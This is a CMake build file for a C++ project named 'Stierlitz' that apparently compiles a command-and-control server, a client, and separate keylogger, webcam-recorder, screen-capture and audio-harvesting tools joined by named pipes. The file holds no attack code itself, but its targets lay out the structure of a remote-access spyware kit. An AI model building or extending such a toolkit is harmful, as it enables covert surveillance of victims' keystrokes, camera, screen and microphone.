cmake_minimum_required(VERSION 3.10)

project(Stierlitz)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)
set(CMAKE_BUILD_TYPE Debug) # For debug mode cmake -DCMAKE_BUILD_TYPE=Debug ..

# Directories
set(SERVER_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Server/include)
set(SERVER_SRC_DIR ${CMAKE_SOURCE_DIR}/Server/src)
set(CLIENT_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Client/include)
set(CLIENT_SRC_DIR ${CMAKE_SOURCE_DIR}/Client/src)
set(COMMON_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Common/include)
set(BIN_DIR ${CMAKE_SOURCE_DIR}/bin)

set(C2_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/c2_terminal.py)
set(C2_IN_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_in_fifo)
set(C2_OUT_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_out_fifo)
set(KEYLOGGER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal)
set(KEYLOGGER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/keylogger_fifo)
set(WEBCAM_RECORDER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/webcam_recorder_terminal)
set(WEBCAM_RECORDER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/webcam_recorder_fifo)
set(SCREEN_HUNTER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/screen_hunter_terminal)
set(SCREEN_HUNTER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/screen_hunter_fifo)
set(ALSA_HARVESTER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/alsa_harvester_terminal)
set(ALSA_HARVESTER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/alsa_harvester_fifo)

find_package(OpenCV REQUIRED)
find_package(ALSA REQUIRED)

# Output directory for binaries
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${BIN_DIR})

# Server target
file(GLOB_RECURSE SERVER_SRC_FILES ${SERVER_SRC_DIR}/*.cpp)
add_executable(server ${SERVER_SRC_FILES})
target_compile_definitions(server PRIVATE SERVER
    C2_SCRIPT_PATH="${C2_SCRIPT_PATH}"
    KEYLOGGER_SCRIPT_PATH="${KEYLOGGER_SCRIPT_PATH}"
    WEBCAM_RECORDER_SCRIPT_PATH="${WEBCAM_RECORDER_SCRIPT_PATH}"
    SCREEN_HUNTER_SCRIPT_PATH="${SCREEN_HUNTER_SCRIPT_PATH}"
    ALSA_HARVESTER_SCRIPT_PATH="${ALSA_HARVESTER_SCRIPT_PATH}"
    C2_IN_FIFO_PATH="${C2_IN_FIFO_PATH}"
    C2_OUT_FIFO_PATH="${C2_OUT_FIFO_PATH}"
    KEYLOGGER_FIFO_PATH="${KEYLOGGER_FIFO_PATH}"
    WEBCAM_RECORDER_FIFO_PATH="${WEBCAM_RECORDER_FIFO_PATH}"
    SCREEN_HUNTER_FIFO_PATH="${SCREEN_HUNTER_FIFO_PATH}"
    ALSA_HARVESTER_FIFO_PATH="${ALSA_HARVESTER_FIFO_PATH}"
)
target_include_directories(server PRIVATE ${SERVER_INCLUDE_DIR} ${COMMON_INCLUDE_DIR})

# Client target
file(GLOB_RECURSE CLIENT_SRC_FILES ${CLIENT_SRC_DIR}/*.cpp)
add_executable(client ${CLIENT_SRC_FILES})
find_package(Threads REQUIRED)
find_package(X11 REQUIRED)
target_include_directories(client PRIVATE ${CLIENT_INCLUDE_DIR} ${COMMON_INCLUDE_DIR} ${X11_INCLUDE_DIR})
target_link_libraries(client PRIVATE Threads::Threads ${X11_LIBRARIES} ${ALSA_LIBRARIES})

if (CMAKE_BUILD_TYPE STREQUAL "Debug")
    target_compile_definitions(client PRIVATE DEBUG_MODE=1)
endif()

# Keylogger Terminal target
file(GLOB_RECURSE KEYLOGGER_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal.cpp)
find_package(PkgConfig REQUIRED)
add_executable(keylogger_terminal ${KEYLOGGER_SRC_FILE})
pkg_check_modules(XKBCOMMON REQUIRED xkbcommon)
target_link_libraries(keylogger_terminal PRIVATE ${XKBCOMMON_LIBRARIES})
target_include_directories(keylogger_terminal PRIVATE ${XKBCOMMON_INCLUDE_DIRS})
set_target_properties(keylogger_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)

# Webcam Terminal target
file(GLOB_RECURSE WEBCAM_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/webcam_recorder_terminal.cpp)
add_executable(webcam_recorder_terminal ${WEBCAM_SRC_FILE})
target_link_libraries(webcam_recorder_terminal ${OpenCV_LIBS})
set_target_properties(webcam_recorder_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)

# Screen Hunter target
find_package(JPEG REQUIRED)
file(GLOB_RECURSE WEBCAM_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/screen_hunter_terminal.cpp)
add_executable(screen_hunter_terminal ${WEBCAM_SRC_FILE})
target_link_libraries(screen_hunter_terminal ${OpenCV_LIBS} JPEG::JPEG)
set_target_properties(screen_hunter_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)

# Alsa Harvester target
file(GLOB_RECURSE ALSA_HARVESTER_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/alsa_harvester_terminal.cpp)
add_executable(alsa_harvester_terminal ${ALSA_HARVESTER_SRC_FILE})
target_link_libraries(alsa_harvester_terminal ${ALSA_LIBRARIES})
target_include_directories(alsa_harvester_terminal PRIVATE ${ALSA_INCLUDE_DIRS})
set_target_properties(alsa_harvester_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)